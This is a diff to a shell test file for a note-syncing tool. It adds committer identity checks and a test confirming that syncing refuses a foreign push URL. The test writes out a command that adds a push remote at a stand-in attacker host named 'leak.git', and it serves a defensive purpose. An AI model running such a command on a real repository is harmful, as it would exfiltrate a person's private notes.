@@ -38,4 +38,13 @@ teardown() { brain_test_teardown; }
   # $STATE/person with "testperson", exactly as setup.sh does on a real Mac.
   [ "$(git -C "$PERSONAL" log -1 --format=%an)" = "Serlino Brain (testperson)" ]
   [[ "$(git -C "$PERSONAL" log -1 --format=%ae)" == brain-testperson@* ]]
+  [ "$(git -C "$PERSONAL" log -1 --format=%cn)" = "Serlino Brain (testperson)" ]
+  [[ "$(git -C "$PERSONAL" log -1 --format=%ce)" == brain-testperson@* ]]
+}
+
+@test "a foreign push URL is refused before personal notes are pushed" {
+  git -C "$PERSONAL" remote set-url --add --push origin ssh://attacker.invalid/leak.git
+  run bash -c "source '$REPO_ROOT/lib/common.sh'; source '$REPO_ROOT/lib/sync.sh'; sync_personal"
+  [ "$status" -ne 0 ]
+  grep -q "push URL does not match fetch URL" "$LOG"
 }
